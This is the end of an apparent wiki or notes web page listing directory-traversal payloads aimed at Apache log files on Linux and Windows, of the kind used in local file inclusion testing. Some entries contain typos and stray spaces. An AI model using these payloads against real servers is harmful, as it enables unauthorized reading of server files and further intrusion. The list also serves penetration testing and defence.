<span class="cp">../../../apache/logs/error.log</span>
<span class="cp">../../../apache/logs/access.log</span>
<span class="cp">../../../../../../../etc/httpd/logs/acces_log</span>
<span class="cp">../../../../../../../etc/httpd/logs/acces.log</span>
<span class="cp">../../../../../../../etc/httpd/logs/error_log</span>
<span class="cp">../../../../../../../etc/httpd/logs/error.log</span>
<span class="cp">../../../../../../../etc/httpd/logs/error_log</span>
<span class="cp">../../../../../../../etc/httpd/logs/error.log</span>
<span class="cp">../../../../../../../var/www/logs/access_log</span>
<span class="cp">../../../../../../../var/www/logs/access.log</span>
<span class="cp">../../../../../../../usr/local/apache/logs/access_ log</span>
<span class="cp">../../../../../../../usr/local/apache/logs/access. log</span>
<span class="cp">../../../../../../../var/log/apache/access_log</span>
<span class="cp">../../../../../../../var/log/apache2/access_log</span>
<span class="cp">../../../../../../../var/log/apache/access.log</span>
<span class="cp">../../../../../../../var/log/apache2/access.log</span>
<span class="cp">../../../../../../../var/log/access_log</span>
<span class="cp">../../../../../../../var/log/access.log</span>
<span class="cp">../../../../../../../var/www/logs/error_log</span>
<span class="cp">../../../../../../../var/www/logs/error.log</span>
<span class="cp">../../../../../../../usr/local/apache/logs/error_l og</span>
<span class="cp">../../../../../../../usr/local/apache/logs/error.l og</span>
<span class="cp">../../../../../../../var/log/apache/error_log</span>
<span class="cp">../../../../../../../var/log/apache2/error_log</span>
<span class="cp">../../../../../../../var/log/apache/error.log</span>
<span class="cp">../../../../../../../var/log/apache2/error.log</span>
<span class="cp">../../../../../../../var/log/error_log</span>
<span class="cp">../../../../../../../var/log/error.log</span>

<span class="m">19.</span> C:\apache\logs\access.log
<span class="m">20.</span> C:\Program Files\Apache Group\Apache\logs\access.log
<span class="m">21.</span> C:\program files\wamp\apache2\logs
<span class="m">22.</span> C:\wamp\logs
<span class="m">23.</span> C:\xampp\apache\logs\error.log

<span class="m">38.</span> C:\apache\logs\error.log
<span class="m">39.</span> C:\Program Files\Apache Group\Apache\logs\error.log
<span class="m">40.</span> C:\wamp\apache2\logs
<span class="m">41.</span> C:\xampp\apache\logs\access.log
</pre></div>
</div>

        </div>
        <div id="footer">
            <span>
                Copyright © 2012-2016 .
                Powered by <a href="http://simiki.org/" target="_blank">Simiki</a>.
            </span>
        </div>
        
    </body>
</html>